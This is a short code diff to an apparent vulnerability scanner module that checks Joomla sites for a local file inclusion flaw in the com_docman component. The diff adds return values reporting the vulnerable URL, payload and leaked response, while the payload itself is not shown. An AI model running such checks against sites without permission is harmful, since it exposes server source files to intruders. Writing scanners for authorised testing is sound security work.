@@ -25,11 +25,14 @@ class joomla_com_docman_lfi_BaseVerify:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if req.status_code == 200 and r"<?php" in req.text:
                 cprint("[+]存在joomla组件com_docman本地文件包含漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return True, vulnurl, "joomla组件com_docman本地文件包含", payload, req.text
             else:
                 cprint("[-]不存在joomla_com_docman_lfi漏洞", "white", "on_grey")
+                return False, None, None, None, None
 
         except:
             cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
+            return False, None, None, None, None
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
